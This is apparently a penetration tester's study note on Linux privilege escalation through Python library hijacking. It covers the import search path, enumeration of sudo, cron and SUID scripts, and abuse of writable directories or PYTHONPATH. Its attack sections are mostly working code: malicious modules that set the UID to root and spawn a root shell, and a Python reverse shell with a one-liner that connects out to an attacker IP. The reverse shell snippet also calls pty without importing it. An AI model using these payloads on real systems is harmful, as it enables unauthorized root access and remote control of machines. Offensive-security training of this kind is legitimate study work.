---
created: 16-01-2026
---

## Importing in Python
### Modules and packages

>A **[module](https://docs.python.org/3/tutorial/modules.html)** is a file that contains Python definitions and statements. 

- The module file name is the module name + `.py` extension.
- A module can contain executable statements as well as function definitions. 
- Statements are intended to initialize the module and are executed *only the first time* the module name is encountered in an import statement (they're also executed if the module is called as a script).

- To use code defined in another module or package, you import it using the [`import`](https://docs.python.org/3/reference/simple_stmts.html#import) statement:

```Python
import module_name
```

>A **[package](https://docs.python.org/3/tutorial/modules.html#packages)** is a directory that contains related Python modules (`.py` files).

```python
package_name/
	__init__.py
	module_1.py
	module_2.py
	...
```

- You can import individual modules from a package:

```Python
import package_name.module_1
```

- Historically, a package required and a special `__init__.py` file that used to mark the directory as a package.
- Since Python 3.3, you can create packages without `__init__.py`, these are called [namespace packages](https://docs.python.org/3/glossary.html#term-namespace-package).
### Searching for modules

When Python interpreter encounters an `import` statement (like `import shutil` or `from os import path`), it searches for a module — a `.py` file with the same name as the import — in several places, in order:

1. **Module cache (`sys.modules`)** 
	- [`sys.modules`](https://docs.python.org/3/library/sys.html#sys.modules) is a dictionary that maps module names to modules which have already been loaded.
	- If the module exist in the cache, Python reuses it without touching the filesystem. **Module code is not executed again**.

- View all currently loaded modules:

```Python
python3 -c "import sys; print('\n'.join(sys.modules))" 
```

2. **Built-in modules**
	- If the requested module is not in `sys.modules`, Python checks **built-in modules** listed in [`sys.builtin_module_names`](https://docs.python.org/3/library/sys.html#sys.builtin_module_names). 
	- Built-in modules are those compiled into the interpreter itself, such as `sys`, `builtins`, `marshal`, `_imp`, `_thread`, and `_io`, and some platform-specific modules (such as `posix` on Unix).

- List built-in modules:

```bash
python3 -c "import sys; print('\n'.join(sys.builtin_module_names))"
```

>[!note] Built-in modules can not be hijacked — they're baked into Python, so it doesn't search for them.

3. **Filesystem search — `sys.path` directories**
	- The module is not found in `sys.modules` or `sys.builtin_module_names`, Python searches **each directory listed in [`sys.path`](https://docs.python.org/3/library/sys.html#sys.path)** in order. 
	- For each entry in `sys.path`, Python looks for matching:
		- `.py` files (e.g., `module_name.py`).
		- `.pyc` files — [compiled Python files](https://docs.python.org/3/tutorial/modules.html#compiled-python-files) (e.g., `module_name.pyc`).
		- `.so` (Linux/Unix) or `.pyd` (Windows) — [compiled C/C++ extension modules](https://docs.python.org/3/extending/building.html) (e.g., `module_name.so` or `module_name.pyd`).
		- [Package](https://docs.python.org/3/tutorial/modules.html#packages) (directory, e.g., `module_name/`).

>[!important] Python uses the first match.

- View the search path:

```bash
python3 -c "import sys; print('\n'.join(sys.path))"
```

>[!example]+ 
> ```Python
> python3 -c "import sys; print('\n'.join(sys.path))"
> ```
> 
> ```bash
> /usr/lib/python314.zip
> /usr/lib/python3.14
> /usr/lib/python3.14/lib-dynload
> /usr/lib/python3.14/site-packages
> ```

### How `sys.path` is constructed

When Python starts, `sys.path` is built from:

- **The directory containing the script being executed** (or the current working directory in interactive mode).
- Directories listed in the **`PYTHONPATH` environment variable**.
- **Standard library modules** (`/usr/lib/pythonX.Y`).
- **Installation-dependent defaults** (standard library, site-packages):
    - `/usr/lib/pythonX.Y/dist-packages/`  — Standard directory for Python packages installed via the system's package manager; Debian/Ubuntu-specific.
    - `/usr/lib/pythonX.Y/sitez-packages/` — Standard directory for third-party Python packages installed with `pip` and other Python packaging tools.
    - `/usr/lib/python3.X/lib-dynload`  — dynamically loaded extension modules (`.so` files) compiled for the specific Python version and system architecture.

>[!note] Root's `sys.path` may differ; check with `sudo python3 -c "import sys; print(sys.path)"`.

>[!note] Python `sys.path` may vary between different Python versions. Verify with `python3 --version`.

If a directory you can write into appears early in `sys.path`, **you can hijack imports**.
## Enumeration

- Search for SUID/SGID Python scripts:

```bash
find / -name "*.py" -perm -4000 -type f 2>/dev/null
```


```bash
find / -name "*.py" -perm -2000 -type f 2>/dev/null
```

>[!note] See [[SUID_&_SGID_privilege_escalation]].

- Check for Python scripts in privileged Cron jobs:

```bash
cat /etc/crontab 
```

```bash
ls -la /etc/cron.* 
```

```bash
sudo crontab -l
```

>[!note] See [[Cron_jobs_privilege_escalation]].

- Check if you can run any Python scripts with `sudo`:

```bash
sudo -l
```

>[!note] See [[sudo_privilege_escalation]].

For each script you found:

- Analyze import statements at the top. Look for custom modules:

```Python
import os
import sys
import backup_util # custom module
from datetime import datetime
```

- Check for dynamic imports (less common but exploitable):

```Python
module_name = "config"
__import__(module_name)
```

- Inspect `sys.path` from the same directory as the target script:

```bash
python3 -c "import sys; print('\n'.join(sys.path))"
```

- Check if you have write permissions in any of the directories in `sys.path`:

```bash
for line in $(python3 -c "import sys; print('\n'.join(sys.path))"); do test -w $line && echo "$line: Writable" || echo "$line: Not writable" ; done
```

## Python library hijacking

>[!warning] Python library hijacking only works when scripts import modules without specifying their full paths.

### Writable script directory

>[!bug] If you can write to the directory where the privileged Python script you can execute is located, you can hijack its import by creating a malicious module in that directory.
>

1. Let's say you find a script `/opt/backup/backup.py` that you can execute with `sudo`. You inspect the script and find that it imports the `shutil` module.
2. You check permissions of the script's directory and see you can write to it:

```bash
ls -lad /opt/scripts
```

3. You check where Python currently loads `shutil` from:

```bash
python3 -c "import shutil; print(shutil.__file__)"
```

```bash
/usr/lib/python3.14/shutil.py
```

4. Since the script directory `/opt/scripts/` comes first in the search path (`sys.path`) during `/opt/scripts/backup.py` execution, you can create `/opt/scripts/shutil.py` and it will be loaded instead:

```Python
import os
import pty

os.setuid(0)
os.setgid(0)
pty.spawn("/bin/bash")
```

5. Save the file and then run the script with `sudo` privileges:

```bash
sudo /usr/bin/python3 /opt/scripts/backup.py
```

The moment Python executes `import shutil`, it will load the module you created, execute the code at the module level, set the effective UID and GID to zero (root), and spawn a root shell.

Any code not inside a function or class definition runs immediately during import. This means you don't need the original script to call any specific function from the hijacked module — the payload will be executed upon importing. 

Using this approach, you can override any modules — even standard ones. 
### `PYTHONPATH`

Some `sudo` configurations preserve or allow setting the `PYTHONPATH` environment variable. If you can execute any script with `sudo`, you may be able to inject a directory  you control into Python's search path and hijack the modules the script imports.

1. Check your `sudo` rights:

```bash
sudo -l
```

Look for `SETENV`, entries with `env_keep+=PYTHONPATH`, or the absence of `env_reset`. In this case, the `PYTHONPATH` environment variable is preserved to the `sudo` environment. 

- If you have permissions to run any script with `sudo`, you can test if `PYTHONPATH`is preserved:

```bash
sudo PYTHONPATH=/tmp python3 -c "import sys; print(sys.path)"
```

If you see `/tmp` in the output, you can exploit this.

Suppose you can run `sudo /usr/bin/python3 /opt/scripts/check.py` and this script imports `random`. Here is how to exploit it:

2. Create a subdirectory for your module in any directory you can write into:

```bash
mkdir /tmp/exploit
```

3. Create a file named `random.py` that spawns a root shell:

```Python
# /tmp/exploit/random.py
import os
import pty

os.setuid(0)
os.setgid(0)
pty.spawn("/bin/bash")
```

4. Execute the script with the custom `PYTHONPATH` directory: 

```bash
sudo PYTHONPATH=/tmp/exploit /usr/bin/python3 /opt/scripts/check.py
```

Python will search `/tmp/exploit` before the standard library locations, load your `random.py` before the standard one, and execute your payload.

### Writable library path

Sometimes you'll find that a directory in Python's default search path has overly permissive permissions. This is less common but does occur, especially in poorly configured systems or legacy installations.

- Enumerate Python library paths and check permissions:

```Python
import sys
import os
for path in sys.path[1:]:  # Skip empty string (current directory)
    if path and os.path.exists(path):
        stat_info = os.stat(path)
        writable = os.access(path, os.W_OK)
        print(f"{path}")
        print(f"  Owner: {stat_info.st_uid}")
        print(f"  Group: {stat_info.st_gid}")
        print(f"  Permissions: {oct(stat_info.st_mode)[-3:]}")
        print(f"  Writable by you: {writable}")
        print()
```

## Payloads and shells

### Reverse shell

```Python
import socket
import subprocess
import os

attacker_ip_address = "10.10.5.11"
listening_port = 1337

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((attacker_ip_address, listening_port))
os.dup2(s.fileno(), 0)
os.dup2(s.fileno(), 1)
os.dup2(s.fileno(), 2)
pty.spawn("/bin/bash")
```

- For a basic socket connection instead of a PTY for a full interactive shell, replace the last line with:

```Python
subprocess.call(["/bin/bash", "-i"])
```

- One-liner: 

```python
import socket,subprocess,os;s=socket.socket();s.connect(("10.10.5.11",1337));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/bash","-i"])
```
## References and further reading

- [`The import system — Python Documentation`](https://docs.python.org/3/reference/import.html) 
- [`Linux Privilege Escalation: Python Library Hijacking — Hacking Articles`](https://www.hackingarticles.in/linux-privilege-escalation-python-library-hijacking/)

